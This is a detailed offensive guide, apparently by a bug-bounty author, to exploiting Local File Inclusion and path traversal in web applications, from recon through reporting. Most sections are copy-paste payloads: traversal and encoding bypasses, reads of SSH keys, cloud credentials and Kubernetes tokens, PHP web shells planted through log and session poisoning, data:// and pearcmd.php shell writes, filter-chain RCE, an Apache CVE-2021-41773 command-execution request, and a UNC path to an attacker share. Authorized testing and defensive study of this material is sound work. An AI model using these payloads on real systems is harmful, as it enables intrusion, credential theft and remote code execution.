# Local File Inclusion / Path Traversal (LFI) — Complete In-Depth Testing Guide (Expert / Bug-Bounty & Red-Team Edition)

**Author:** x8bitranjit
**Scope:** Any feature where a parameter selects a **file/path/template the server reads or includes** — `?page=`, `?file=`, `?template=`, `?lang=`, `?download=`, theme/skin selectors, PDF/report generators, i18n loaders, log viewers, avatar/path handlers, `include()/require()/readfile()/fopen()/file_get_contents()` sinks
**Platforms:** Kali/Linux first-class; Windows targets + Windows/WSL testing notes provided
**Companion files in this folder:**
- `LFI_ARSENAL.md` — traversal strings, encodings, PHP/wrapper payloads, log-poisoning + filter-chain RCE (copy-paste)
- `LFI_CHECKLIST.md` — the testing-order checklist you tick per sink
- `LFI_REPORT_TEMPLATE.md` — the report skeleton that gets paid
- `poc/` — runnable tooling (traversal fuzzer, php://filter source-dumper, filter-chain RCE builder, log-poison helper)

> **Companion to the RFI / FileUpload / SSRF / Command-Injection / JS-files guides.** Same philosophy: *find* is Part I–II, *get paid* is Part III–IV. LFI is one of the **highest-ceiling** web classes: it starts as "read a file" and, done right, ends at **remote code execution / a shell.** The mistake hunters make is reporting `/etc/passwd` and stopping — that's a **Medium info-leak.** The real prize is **LFI → source/secret disclosure → RCE** via log poisoning, PHP wrappers, session files, or filter-chains. Read Part III before you celebrate a passwd dump.

---

> ### ⚡ READ THIS FIRST — why most LFI reports underpay (or get closed)
> 1. **`/etc/passwd` is proof, not impact.** Reading `passwd` confirms traversal; it's a non-sensitive file by design. The bounty is **(a)** reading **secrets** (app config with DB/cloud creds, `.env`, private keys, `web.config`) or **(b)** turning the read into **RCE/shell** (§11–§16). Climb from "I can read a file" to "I can read your secrets / run my code."
> 2. **LFI → RCE is the headline.** On PHP especially, an inclusion sink is frequently a path to code execution: **log poisoning**, **`php://filter` chain**, **session-file poisoning**, **`data://`/`expect://` wrappers**, **`/proc/self/environ`**, **phpinfo race**, or **LFI + upload**. Always try to escalate to a shell before reporting (§11–§16).
> 3. **`php://filter` reads source without a shell.** `php://filter/convert.base64-encode/resource=config.php` returns the **base64 of the source** (not its executed output) — so you exfiltrate `config.php`, DB creds, keys, and the rest of the app's source. This is the fastest LFI win and the gateway to everything else (§9).
> 4. **The whole game is reaching the file + controlling enough of the path.** Defenses force a prefix/suffix (a directory, a forced `.php`/`.html` extension), strip `../`, or allowlist names. Your job is to **escape the directory** and **defeat the suffix** — traversal, encoding, nested `....//`, wrapper schemes, null-byte (legacy), and path-truncation are how (Part II).
> 5. **Include vs read changes everything.** If the sink **includes/executes** the file (PHP `include`), poisoned content **runs** → RCE. If it only **reads/returns** bytes (`readfile`), you get **disclosure** (still high if it's secrets/source). Identify which you have early (§4).
>
> **Where the money is (memorize this order):** ① **LFI → RCE/shell (log poison / filter-chain / session / wrappers / upload) — Critical** → ② **source + secret disclosure (`php://filter` of config/.env/keys) → creds → pivot/RCE — High–Critical** → ③ **arbitrary sensitive file read (`/proc/self/environ`, k8s/cloud creds, `web.config`) — High** → ④ **`/etc/passwd`-class non-secret read / path traversal confirmation — Medium** → ⑤ *then* blind/limited reads as **Low–Medium**, not headliners.

---

## Table of Contents

**▶ [Master Testing Sequence — the testing order](#master-testing-sequence--the-testing-order)**

**PART I — FOUNDATIONS, RECON & BASELINE**
1. [Environment & Tooling Setup](#1-environment--tooling-setup)
2. [LFI Anatomy — Sinks, Read-vs-Include & Why It Pays](#2-lfi-anatomy)
3. [Reconnaissance — Find Every File/Path Sink](#3-reconnaissance--find-every-filepath-sink)
4. [Baseline — Confirm Traversal & Classify the Sink](#4-baseline--confirm-traversal--classify-the-sink)

**PART II — REACHABILITY & FILTER BYPASS (work in this order)**
5. [Path Traversal — Escaping the Directory](#5-path-traversal--escaping-the-directory)
6. [Defeating the Forced Suffix/Extension](#6-defeating-the-forced-suffixextension)
7. [Encoding & Filter Bypasses](#7-encoding--filter-bypasses)
8. [Allowlist / Prefix Bypasses](#8-allowlist--prefix-bypasses)
9. [PHP & Protocol Wrappers (`php://filter`, `data://`, `expect://`, `phar://`)](#9-php--protocol-wrappers)

**PART III — EXPLOITATION BY IMPACT (where the money is)**
10. [Source & Secret Disclosure (config, .env, keys)](#10-source--secret-disclosure)
11. [LFI → RCE: Log Poisoning](#11-lfi--rce-log-poisoning)
12. [LFI → RCE: `php://filter` Chain (no file write)](#12-lfi--rce-phpfilter-chain)
13. [LFI → RCE: Session-File & `/proc` Poisoning](#13-lfi--rce-session--proc-poisoning)
14. [LFI → RCE: `data://` / `expect://` / `phar://` Wrappers](#14-lfi--rce-wrappers)
15. [LFI → RCE: Upload + Include & phpinfo Race](#15-lfi--rce-upload--phpinfo-race)
16. [Windows LFI & Other Stacks (Java/Node/Python/.NET)](#16-windows-lfi--other-stacks)

**PART IV — VALIDITY, SEVERITY & REPORTING (the bug-bounty layer)**
17. [The Validity-First Mindset](#17-the-validity-first-mindset)
18. [False Positives — STOP reporting these](#18-false-positives--stop-reporting-these-auto-reject-list)
19. [Severity Calibration](#19-severity-calibration--how-triagers-really-rate-lfi)
20. [Impact-Escalation Playbooks — "you found X, now do Y"](#20-impact-escalation-playbooks--you-found-x-now-do-y)
21. [Building a Professional, Safe PoC](#21-building-a-professional-safe-poc)
22. [Reporting, CWE/CVSS & De-duplication](#22-reporting-cwecvss--de-duplication)
23. [Automation & Red-Team Notes](#23-automation--red-team-notes)

**Appendices**
- [Appendix A — LFI Workflow Cheat Sheet](#appendix-a--lfi-workflow-cheat-sheet)
- [Appendix B — LFI → RCE Decision Tree](#appendix-b--lfi--rce-decision-tree)
- [Appendix C — Important Links](#appendix-c--important-links)

---

# Master Testing Sequence — The Testing Order

> **This is the spine.** Work top-to-bottom. Numbered sections (1–23) are reference detail; this is the order you execute.

```
PHASE 0  RECON            → find EVERY param/feature that selects a file/path/template the server reads/includes (§3)
PHASE 1  BASELINE  ★      → confirm traversal (read a known file); is the sink READ or INCLUDE? PHP? (§4)
PHASE 2  REACH THE FILE   → escape the directory (§5) · defeat the forced suffix (§6) · encodings (§7) · allowlist (§8)
PHASE 3  WRAPPERS         → php://filter (source/secrets) · data/expect/phar (§9) — read source & set up RCE
PHASE 4  IMPACT  ⭐ (money)→ climb to the top:
                            source+secret disclosure (§10) → RCE: log poison (§11) · filter-chain (§12) ·
                            session/proc (§13) · data/expect/phar (§14) · upload+include / phpinfo race (§15) ·
                            Windows/other stacks (§16)
PHASE 5  VALIDATE→REPORT  → validity (§17) · false-positive filter (§18) · severity+CVSS+CWE-98/22/73 (§19) ·
                            SAFE PoC (§21) · dedup (§22) · report template
```

**Phase-by-phase, with the deliverable before moving on:**

1. **PHASE 0 — Recon.** Enumerate **every** sink where a parameter picks a file/path/template (§3). *Deliverable:* a list of inclusion/read sinks.
2. **PHASE 1 — Baseline ⭐.** Confirm traversal by reading a known-safe file; determine whether the sink **includes** (executes) or **reads** (returns) and the stack/language (§4). *Deliverable:* confirmed traversal + sink class.
3. **PHASE 2 — Reach the file.** Escape the directory and defeat any forced prefix/suffix and input filters (§5–§8). *Deliverable:* arbitrary file path reaching the sink.
4. **PHASE 3 — Wrappers.** Use `php://filter` to dump source/secrets and set up the RCE wrappers (§9). *Deliverable:* app source + secrets, and a known-good wrapper.
5. **PHASE 4 — Impact ⭐.** Disclose secrets (§10), then escalate to **RCE/shell** by whichever path the target allows: log poisoning (§11), filter-chain (§12), session/`/proc` (§13), `data://`/`expect://`/`phar://` (§14), upload+include / phpinfo race (§15); handle Windows/other stacks (§16). *Deliverable:* demonstrated highest impact (RCE marker / secrets).
6. **PHASE 5 — Validate → report.** Apply validity & false-positive filters (§17/§18), set a defensible CVSS/CWE (§19), build a clean *safe* PoC (§21), de-dup, write it up (§22). *Deliverable:* the submitted report.

Reference anytime: payloads → `LFI_ARSENAL.md`; checklist → `LFI_CHECKLIST.md`; scripts → `poc/`; playbooks **§20**.

---

# PART I — FOUNDATIONS, RECON & BASELINE

# 1. Environment & Tooling Setup

| Tool | Job |
|------|-----|
| **Burp Suite** (Repeater/Intruder) | tamper the path param; replay; the core tool |
| **`poc/lfi_fuzz.py`** | spray traversal/encoding/wrapper payloads, detect file-content signatures |
| **ffuf / wfuzz** | fast traversal + LFI wordlist fuzzing (`FUZZ` in the param) |
| **`poc/phpfilter_dump.py`** | dump source via `php://filter/convert.base64-encode` and decode |
| **`poc/filter_chain_rce.py`** | build a `php://filter` chain that yields RCE without a file write |
| **`poc/logpoison.py`** | inject a PHP payload into a log via a poisonable header, then include it |
| **LFISuite / liffy / Kadimus** | automated LFI→RCE frameworks (verify by hand) |
| **a public box / interactsh** | OOB for blind LFI, RFI handoff, and wrapper callbacks |
| **SecLists** | `Fuzzing/LFI/*`, `Discovery/Web-Content`, sensitive-file lists |

```bash
# Kali/WSL
python3 poc/lfi_fuzz.py -u "https://target/?page=FUZZ" --signatures
ffuf -u "https://target/?page=FUZZ" -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -mr "root:.*:0:0:"
python3 poc/phpfilter_dump.py -u "https://target/?page=PHP" -r config.php
```
> **Windows:** drive Burp on Windows; run the Python `poc/` helpers and the Linux frameworks in **WSL**. For **Windows targets**, swap payloads to `..\..\` / `C:\Windows\win.ini` (§16).

---

# 2. LFI Anatomy

## 2.1 What LFI is
A parameter influences a path passed to a file API. If you can steer that path with `../` (or an absolute path or a wrapper), you read — or, when the sink **executes** the file, *run* — content of your choosing.

## 2.2 Read vs Include (decides your ceiling)
```
INCLUDE/EXECUTE  (PHP include/require, some template engines) → poisoned content RUNS → RCE. Highest ceiling. ⭐
READ/RETURN      (readfile, file_get_contents→echo, sendFile)  → DISCLOSURE (source/secrets/sensitive files). High if secrets.
```

## 2.3 Where LFI sinks live
```
□ Params:    page= file= path= template= tpl= lang= locale= view= include= doc= document= download= dl= read=
             theme= skin= style= module= layout= cat= folder= item= load= content= name= img= avatar= report=
□ Features:  template/theme selectors · i18n/language loaders · "download this document" · PDF/report builders
             log viewers · file managers · plugin/module loaders · avatar/path handlers · markdown/file previews
□ Sinks (grep source/JS):  include() require() include_once() readfile() file_get_contents() fopen() fread()
             show_source() highlight_file() (PHP) · fs.readFile()/sendFile()/res.render() (Node) · open()/Template (Py)
             new File()/getResourceAsStream() (Java) · @Html.Partial()/Server.MapPath (.NET)
□ Indirect:  a stored value (filename in DB/profile) later used in a path → second-order LFI.
```

## 2.4 Why it pays
- **Direct path to RCE** on PHP via logs/wrappers/sessions — a single param can become a shell.
- **Secrets & source** — `php://filter` dumps `config.php`/`.env`/keys → DB/cloud creds → lateral movement & RCE elsewhere.
- **Cloud/container creds** — `/proc/self/environ`, k8s SA tokens, `.aws/credentials` → cloud takeover.

> **The mental model:** an LFI sink is a **read/exec primitive pointed at the local filesystem.** Severity = whether you can point it at **secrets** (disclosure) or get it to **execute attacker content** (RCE). Always push toward execute.

---

# 3. Reconnaissance — Find Every File/Path Sink

```
□ Param names:    fuzz the names in §2.3 (Arjun/param-miner) across every endpoint.
□ Anything that returns a FILE: downloads, "view document", export, report, image-by-path, attachment handlers.
□ Template/lang/theme switches: ?lang=en ?theme=dark ?view=home — classic include sinks.
□ JS/source recon (JS-files kit): grep for include/require/readFile/sendFile/render with a user-controlled arg.
□ Error messages: a path in a stack trace (".../views/home.php") tells you the base dir + suffix to defeat.
□ Wayback/params: old endpoints with file/path params (gau/waybackurls).
```
> **If this → then that:** a param value ends up as a **filename/path** (you see it echoed in an error, or changing it changes which page renders) → that's your candidate. A **download/export/PDF** feature → test traversal *and* `php://filter` immediately (these are high-yield). A param feeding **PHP `include`** → prioritise it: that's your RCE path.

---

# 4. Baseline — Confirm Traversal & Classify the Sink

**Do this before deep payloads.** Establish (a) traversal works, (b) read-vs-include, (c) the stack and any forced suffix.

## 4.1 Confirm traversal (read a known file)
```
Linux:    ?page=../../../../etc/passwd          → look for "root:x:0:0:"
          ?page=../../../../etc/hostname         → benign single-line marker
Windows:  ?page=..\..\..\..\Windows\win.ini      → look for "[fonts]" / "[extensions]"
Depth:    increase ../ count (try 1–12); the app's directory depth is unknown — sweep it.
```

## 4.2 Classify the sink
```
□ Forced suffix? Try ?page=../../../../etc/passwd%00  (legacy) and ?page=/etc/passwd   then ?page=../../etc/passwd
   If "/etc/passwd.php not found" appears → a ".php" SUFFIX is appended → §6.
□ Forced prefix/dir? If only files under /var/www/html/pages/ load → a PREFIX dir → traverse out of it (§5).
□ READ or INCLUDE? Request a path to a known PHP file with PHP tags:
   - If you get the SOURCE/raw text → READ sink (use php://filter, §9/§10).
   - If you get the EXECUTED OUTPUT (or your poisoned PHP runs) → INCLUDE sink (push to RCE, §11–§15). ⭐
□ Stack? .php in paths/errors → PHP (wrappers + log/session RCE). Java/Node/Py/.NET → §16.
```

## 4.3 Note what you'll need next
- The **base directory + suffix** (from errors) → how many `../` and which suffix bypass (§6).
- **PHP?** → `php://filter` to dump source/secrets is your immediate next move (§9/§10).
- **Include sink?** → plan the RCE path (logs/wrappers/session) (§11–§15).

> **Don't stop at `/etc/passwd`.** Confirming traversal is Phase 1. The report is **secrets or RCE** (Phase 4). A passwd dump alone is a **Medium**; keep climbing.

---

# PART II — REACHABILITY & FILTER BYPASS (work in this order)

> Full payload lists are in `LFI_ARSENAL.md`. These sections teach the *logic* of reaching the file you want.

# 5. Path Traversal — Escaping the Directory

```
Basic:        ../../../../etc/passwd                 (sweep depth 1–12)
Absolute:     /etc/passwd                            (if no forced prefix)
Trailing:     ../../../../etc/passwd%00              (null byte — PHP < 5.3.4 / legacy)
Over-traverse: lots of ../ is harmless — extra ones are ignored, so over-shoot the depth.
Start-with-slash defeat:  ....//....//....//etc/passwd
```
**Why depth-sweep:** you don't know how deep the script lives, so try increasing `../` counts. Over-traversing is safe (filesystem ignores extra `../` at root).

> **If this → then that:** a **forced prefix directory** is in play (only files under a base dir load) → you must traverse **out** of it — keep adding `../` until `/etc/passwd` resolves. If `../` is **stripped once** (non-recursively), use `....//` (§7).

---

# 6. Defeating the Forced Suffix/Extension

When the app appends an extension (`include("pages/" . $_GET['page'] . ".php")`):
```
Null byte (legacy):     ?page=../../../../etc/passwd%00            (truncates ".php"; PHP<5.3.4)
Path truncation (legacy): ?page=../../../etc/passwd/./././…(×2048)  or  ../../../etc/passwd\.\.\.  (old PHP)
Wrapper that ignores suffix: php://filter/...&resource=... (often the suffix lands harmlessly, §9)
Use the suffix:         if it forces .php and the sink INCLUDES → host/point at a .php you control (RFI/upload, §15)
Read same-extension files: target real .php files via php://filter to dump their source (§10) (suffix is fine then)
Question-mark/Hash (URL-as-path, RFI): ...passwd?  /  ...passwd#  (when remote/url wrappers are involved)
```
> **If this → then that:** a forced `.php` suffix blocks raw file reads → pivot to **`php://filter`** (the suffix becomes part of the resource and you still read source, §9/§10), or to **log/session poisoning** where the included file is a real on-disk path you control (§11/§13). The suffix that blocks reads often *doesn't* block the RCE techniques.

---

# 7. Encoding & Filter Bypasses

When `../` is filtered or normalized:
```
URL-encode:        ..%2f..%2f..%2fetc%2fpasswd
Double URL-encode: ..%252f..%252f..%252fetc%252fpasswd     (decoded twice somewhere in the stack)
16-bit unicode:    ..%c0%af..%c0%afetc/passwd   ..%u2215..    (over-long / unicode slash — legacy servers)
Nested (defeats one-pass strip):  ....//....//etc/passwd    ..././..././etc/passwd   ....\/....\/
Backslash (Windows/mixed):        ..\..\..\..\windows\win.ini    ..%5c..%5c..
Strip-and-rebuild:  ..../\..../\   (filter removes "../", residue rebuilds it)
Dot-truncation/space:  ../../../etc/passwd%20   ../../../etc/passwd.
Mixed-case (case-insensitive FS / Windows):  ..%2F..%2FETC/passwd
```
> **If this → then that:** the filter strips `../` exactly once (non-recursive) → **`....//`** rebuilds to `../` after the strip — the single most reliable bypass. If the app decodes input twice → **double-encode** (`%252f`). Test these systematically; one almost always lands.

---

# 8. Allowlist / Prefix Bypasses

When only certain names/paths are allowed:
```
Allowed-prefix abuse:  if it requires the value to start with an allowed dir, traverse after it:
                       ?file=/var/www/html/uploads/../../../../etc/passwd
Allowed-name + traversal: ?lang=en/../../../../etc/passwd     (passes "starts with a known value")
Wrapper prefix:        php://filter/.../resource=<allowed>../../../etc/passwd
Substring checks:      include the allowed token somewhere harmless in the path.
```
> **If this → then that:** the app insists the path **contains/starts-with** an allowed directory → satisfy that, then traverse out (`/<allowed>/../../../../etc/passwd`). Combine with the §7 encoding bypass if `../` is also filtered.

---

# 9. PHP & Protocol Wrappers

PHP wrappers turn an LFI into source disclosure and, often, RCE. **Always test these on a PHP target.**
```
php://filter   → READ source (base64) without executing it — THE source/secret dumper (§10):
                 php://filter/convert.base64-encode/resource=config.php
                 php://filter/read=string.rot13/resource=index.php
php://input    → if the include reads the request BODY as PHP (POST body = <?php system($_GET['c']);?>) → RCE (§14).
data://        → data://text/plain;base64,<b64 of PHP> → include executes it → RCE (needs allow_url_include) (§14).
expect://      → expect://id → runs a shell command directly → RCE (needs the expect extension) (§14).
phar://        → phar://evil.phar/x → triggers PHP object injection on deserialization → RCE (§14).
zip://         → zip://archive.zip%23shell.php → include a file inside an uploaded zip → RCE (§15).
glob:// / file:// → enumerate/read.
```
> **If this → then that:** PHP + a READ sink → `php://filter/convert.base64-encode/resource=` to dump **every** source file and config (§10). PHP + an INCLUDE sink + `allow_url_include=On` → `data://` or `php://input` is instant RCE (§14). Even with `allow_url_include=Off`, the **filter-chain** technique (§12) gives RCE from `php://filter` alone — no remote URL needed.

---

# PART III — EXPLOITATION BY IMPACT (where the money is)

> Every RCE PoC uses a **benign marker** (`echo` a unique token / `id`) on **your authorized** target, and you **delete artifacts** (poisoned logs, uploaded files) afterward (§21).

# 10. Source & Secret Disclosure

The fastest high-value win on PHP: dump source + secrets with `php://filter`.
```bash
# dump a file's source (base64) then decode:
curl -s "https://target/?page=php://filter/convert.base64-encode/resource=config.php" | base64 -d
# walk the app: index.php → see includes → dump each (config, db, .env loader, auth, admin)
python3 poc/phpfilter_dump.py -u "https://target/?page=PHP" -r config.php -r database.php -r .env
```
High-value targets:
```
config.php  database.php  settings.php  wp-config.php  .env  app/config/*  secrets.*  auth.php
/etc/passwd  /etc/hosts  /proc/self/environ  /proc/self/cmdline  ~/.aws/credentials  ~/.ssh/id_rsa
/var/run/secrets/kubernetes.io/serviceaccount/token   /etc/nginx/nginx.conf   /etc/apache2/*  .git/config
```
> **If this → then that:** you dumped **DB/cloud creds** from `config.php`/`.env` → validate them (SSRF/JS-files discipline: read-only) → pivot to the DB or cloud (often **RCE** there). You dumped a **private key / k8s SA token** → cluster/host access. Source disclosure alone (with secrets) is **High–Critical**; without secrets, still High for proprietary source.

---

# 11. LFI → RCE: Log Poisoning

If the sink **includes** files and you can write attacker text into a log the server will include, you get RCE.
```
1. Find an includable log:  /var/log/apache2/access.log  /var/log/nginx/access.log  /var/log/auth.log
   /var/log/apache2/error.log  /var/log/vsftpd.log  /var/log/mail.log  /proc/self/fd/N  (also SSH auth.log)
2. Poison it: put PHP in a field that gets logged verbatim — the User-Agent or the request line:
   User-Agent: <?php system($_GET['c']); ?>
   (or request a path like  GET /<?php system($_GET['c']);?>  → lands in access.log)
3. Include the log via the LFI:  ?page=../../../../var/log/apache2/access.log&c=id
   → the PHP in the log executes → command output returned → RCE.
```
> **If this → then that:** include sink + a **readable, poisonable log** (web/SSH/mail) → inject `<?php system($_GET['c']);?>` via User-Agent, then include the log with `&c=id` → **shell**. SSH `auth.log` poisoning (`ssh '<?php ...?>'@target`) works when you can't reach the web log. This is the classic, most reliable LFI→RCE.

---

# 12. LFI → RCE: `php://filter` Chain (no file write)

Modern, file-write-free RCE: chain PHP filters to **synthesize arbitrary PHP bytes** from `php://filter` and have the include execute them — works even with `allow_url_include=Off` and no writable file.
```
Tooling: poc/filter_chain_rce.py  (or synacktiv's php_filter_chain_generator.py)
What it does: builds a long php://filter/.../resource=... that, when included, produces e.g. <?php system($_GET[c]);?>
Use it:
  python3 poc/filter_chain_rce.py --cmd 'id' > chain.txt        # prints the filter chain
  curl -s "https://target/?page=$(cat chain.txt)&c=id"          # include it → RCE
```
> **If this → then that:** PHP **include** sink but no log access, no upload, `allow_url_include=Off` → the **filter-chain** is your RCE: it needs only the single LFI parameter and no writable location. It's the go-to modern technique when log/session poisoning is unavailable. (Generate the chain with the bundled script.)

---

# 13. LFI → RCE: Session-File & `/proc` Poisoning

```
PHP session poisoning:
  1. Find PHPSESSID; sessions store at /var/lib/php/sessions/sess_<ID>  (or /tmp/sess_<ID>).
  2. Get attacker text into your session (a username/field reflected into $_SESSION):
       set a profile field / param to:  <?php system($_GET['c']); ?>
  3. Include your session file:  ?page=../../../../var/lib/php/sessions/sess_<YOUR_ID>&c=id  → RCE.

/proc poisoning:
  /proc/self/environ  → if your input lands in an env var (User-Agent on old CGI) and the sink includes it → RCE.
  /proc/self/fd/<n>   → file descriptors of open logs; brute n to find an includable, poisoned log.
  /proc/self/cmdline  → args; sometimes attacker-controlled.

session.upload_progress poisoning (works even with NO app field reflected into the session — the BIG one):
  PHP writes an upload-progress entry into the SESSION FILE whenever session.upload_progress.enabled=On (default).
  You control the `name` portion → inject PHP there → then include the session file. Steps:
  1. POST a multipart upload to ANY endpoint with:
       - a form field named exactly  PHP_SESSION_UPLOAD_PROGRESS  whose VALUE is  <?php system($_GET['c']); ?>
       - a file part (any) so the upload actually streams
       - cookie PHPSESSID=<known>   (set/keep your own session id)
  2. RACE it: progress data is written then cleaned up fast → send the upload + the LFI include CONCURRENTLY (repeat):
       ?page=../../../../var/lib/php/sessions/sess_<known>&c=id     → RCE
  Why it matters: needs only an upload endpoint + your own session — NO app feature that stores your text in $_SESSION.
```
> **If this → then that:** you have an include sink + a session dir but **no app field lands in `$_SESSION`** → use **`session.upload_progress`**: POST a multipart with the field `PHP_SESSION_UPLOAD_PROGRESS = <?php … ?>`, then **race** the include of your `sess_<ID>` file → **RCE** (Critical). It's the most reliable session-poisoning path on default PHP because it doesn't need any reflected profile field. Clean up the session afterward.

---

# 14. LFI → RCE: `data://` / `expect://` / `phar://` Wrappers

```
data://  (needs allow_url_include=On):
  ?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+&c=id
  (base64 = <?php system($_GET['c']);?>)  → include executes it → RCE.

php://input (needs allow_url_include=On):
  ?page=php://input    with POST body:  <?php system($_GET['c']); ?>   (&c=id in query) → RCE.

expect://  (needs the expect extension):
  ?page=expect://id    → runs `id` directly → RCE.

phar://  (deserialization → object injection, no allow_url_include needed):
  Upload/host a crafted .phar whose metadata triggers a POP chain in the app's classes:
  ?page=phar://uploaded.phar/test   → unserialize on the phar metadata → RCE if a gadget exists.
```
> **If this → then that:** `allow_url_include=On` (check via a dumped `phpinfo`/config) → `data://`/`php://input` is the cleanest RCE. A way to **upload a file** (even non-executable) + the app uses vulnerable classes → **`phar://`** deserialization RCE without `allow_url_include`. Pick the wrapper your config permits.

---

# 15. LFI → RCE: Upload + Include & phpinfo Race

```
Upload + include (the FileUpload kit's friend):
  1. Upload ANY file whose CONTENT is PHP (image with PHP in EXIF/appended, a .txt, a zip) — extension may not matter
     because the LFI INCLUDES it by path.
  2. Include the uploaded file by its on-disk path:  ?page=../../../../var/www/uploads/avatar.jpg&c=id  → RCE.
  zip:// variant:  upload shell.jpg that's a zip containing shell.php → ?page=zip://.../avatar.jpg%23shell.php

phpinfo LFI race (classic):
  If a phpinfo() page exists, a multipart upload creates a TEMP file (/tmp/php??????) shown in phpinfo's output.
  Race: read the temp filename from phpinfo and include it before PHP deletes it → RCE (LFISuite automates).

pearcmd.php — RCE with NO upload, NO log/session write (default PHP Docker/official images — the modern go-to):
  Official `php`/`php:*-apache` images ship PEAR at /usr/local/lib/php/pearcmd.php and register_argc_argv=On.
  An include sink that lets you add query params (the `?+` becomes argv) turns pearcmd into an arbitrary-file WRITE → web shell:
    ?page=/usr/local/lib/php/pearcmd.php&+config-create+/<?=system($_GET['c'])?>+/tmp/shell.php
    then include it:  ?page=/tmp/shell.php&c=id        → RCE
  Variants of the writable path/poisoned content per filter; also /usr/share/php/pearcmd.php on some distros.
  Companion files that help: /usr/local/lib/php/peclcmd.php (same trick); Twig/Smarty cache dirs if writable.
```
> **If this → then that:** PHP **include** sink on a **containerized/default PHP** stack (very common today) with **no** writable upload/log/session you can reach → try **`pearcmd.php`**: it's already on disk, and `register_argc_argv` turns your `?+…` into argv so `config-create` **writes a PHP file you then include** → **RCE** without uploading anything. This is frequently the *only* RCE path on a hardened, read-only-app container — a clean Critical. (Delete the written shell afterward.)

---

# 16. Windows LFI & Other Stacks

## 16.1 Windows targets
```
Confirm:   ?page=..\..\..\..\Windows\win.ini   ( [fonts]/[extensions] )   or  ?page=C:\Windows\win.ini
Secrets:   C:\inetpub\wwwroot\web.config  (DB/conn strings)  ·  C:\Windows\System32\drivers\etc\hosts
           C:\xampp\php\php.ini  ·  C:\Windows\repair\SAM  ·  app config under inetpub
RCE-ish:   include of IIS/FTP logs (C:\inetpub\logs\LogFiles\...) → log poisoning equivalent.
UNC:       \\attacker\share\shell.php  (if remote/UNC allowed → RFI-style RCE; cross-ref RFI kit).
```

## 16.2 Other stacks (read-focused; RCE varies)
```
Java:    traversal → read WEB-INF/web.xml, classes, /etc/passwd; .jsp include can → RCE (rare); ?page=../../etc/passwd
Node:    res.sendFile/readFile traversal → read source/.env; template engines may → SSTI (cross-ref SSTI kit).
Python:  open()/send_file traversal → read settings.py/.env; Jinja file include → SSTI (SSTI kit) → RCE.
.NET:    Server.MapPath/@Html.Partial traversal → read web.config (conn strings/machineKey → forge auth).
Ruby:    render/File.read traversal → read secrets.yml/database.yml; ERB include → RCE possibility.
```
> **If this → then that:** non-PHP stack → you usually get **disclosure** (read source/config/secrets) which is High when it's `web.config` conn strings, `.env`, `settings.py`, `database.yml`, or a **.NET `machineKey`** (forge auth → RCE). For RCE, pivot to the matching kit (SSTI for template engines; RFI/Upload for include sinks).

## 16.3 Server / infrastructure path traversal (the bug is in the *server*, not the app)
Sometimes the traversal isn't in app code but in the **web server / proxy / framework** — these read (and sometimes execute) files regardless of language. Test them directly:
```
Apache 2.4.49 (CVE-2021-41773) / 2.4.50 (CVE-2021-42013) — path traversal → FILE READ, and RCE if mod_cgi/cgi-bin enabled:
  GET /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
  RCE: POST /cgi-bin/.%2e/...%2e%2e/bin/sh   with body  echo;id
nginx "alias" off-by-slash misconfig — read source OUTSIDE the alias root:
  location /static { alias /var/www/app/static/; }   →   GET /static../config/app.py   (no trailing slash on alias)
IIS / .NET — ..%c0%af / ..%255c / Unicode + ;.aspx tricks ; reach /WEB-INF, machineKey, web.config.
Tomcat / Spring — static-resource traversal → /WEB-INF/web.xml, classes (gadget hunting for deserialization).
Reverse-proxy normalization gaps — front-end and origin decode %2e/%2f differently → traversal slips through.
```
> **If this → then that:** the target runs **Apache 2.4.49/50** → try the `.%2e/` cgi traversal for **file read** (and RCE if `cgi-bin` is mapped) — a server-level Critical that needs no app param. A **nginx `alias`** without a trailing slash → off-by-slash read of source outside the root. These are infrastructure bugs; confirm the version first (Server header / behavior).

## 16.4 Second-order / stored LFI
The path you supply isn't included immediately — it's **stored** (a profile field, a "last theme/template", a filename in the DB, a config value) and **included later** by a backend job, a different page, or an admin view.
```
1. Set a stored value (theme/template/avatar-path/locale) to a traversal/wrapper payload:  ../../../../etc/passwd
   or  php://filter/convert.base64-encode/resource=config.php
2. Trigger the consumer (reload the page, wait for the job, get an admin to view your profile).
3. The stored payload is included → file read / RCE in that (often higher-priv) context.
```
> **If this → then that:** a value you control is **stored and later used as a path** (theme/template/locale/filename) → second-order LFI. It often fires in a **back-office/worker/admin** context with broader filesystem access → higher impact than a reflected LFI. Plant the payload, then trigger the consumer and watch for the read/RCE (or an OOB hit for a wrapper).

---

# PART IV — VALIDITY, SEVERITY & REPORTING

# 17. The Validity-First Mindset

## 17.1 The four questions a triager asks (answer them in your report)
1. **Does the param read/include an arbitrary file?** Show a clear file read (signature) + the exact payload.
2. **What concrete impact beyond `/etc/passwd`?** Secrets disclosed, source dumped, or **RCE** — name it.
3. **What does the attacker need?** Often just an unauthenticated request → low bar = higher severity.
4. **Reproducible & in scope?** Exact endpoint, payload, bypass, and the evidence (file contents / RCE marker).

## 17.2 The "read vs impact" rule (most important)
| You have | Standalone verdict | Becomes valuable when… |
|---|---|---|
| `/etc/passwd` / `win.ini` read | Medium (traversal proof) | …you read **secrets** or reach **RCE**. |
| Source disclosure (no secrets) | Medium–High | …it contains creds/keys → High–Critical. |
| Secret disclosure (DB/cloud creds, keys, `.env`) | **High** | …creds are live → pivot/RCE → Critical. |
| `/proc/self/environ`, k8s/cloud creds | **High** | …creds grant cloud/cluster access → Critical. |
| **LFI → RCE** (log/filter-chain/session/wrapper/upload) | **Critical** | It's already the top — demonstrate the shell safely. |
| Blind/limited read (timing/error only) | Low–Medium | …you turn it into a real read or RCE. |

## 17.3 Production-scope discipline
Confirm on **production**. Validate disclosed creds **read-only**. For RCE, run a **benign marker** (unique echo / `id`) and **clean up** poisoned logs/uploaded files. Re-test partial fixes (blocking `../` but not `....//`, or `/etc/passwd` but not `php://filter`, is a fresh valid finding).

---

# 18. False Positives — STOP reporting these (auto-reject list)

| # | Commonly mis-reported | Why it's NOT (by default) | When it IS valid |
|---|---|---|---|
| 1 | **`/etc/passwd` read, reported as Critical** | passwd is non-sensitive; it's traversal **proof**, not impact. | Escalate to secrets/source/RCE; passwd alone is ~Medium. |
| 2 | **A 404/"file not found" reflecting your path** | No actual read — just an echoed param. | The file's **contents** are returned. |
| 3 | **Reading a file the app is meant to serve** (a public asset) | Intended. | You read **outside** the intended dir (traversal) or secrets. |
| 4 | **"Open redirect"/SSRF mislabeled as LFI** | Different class. | A genuine local-file read/include. |
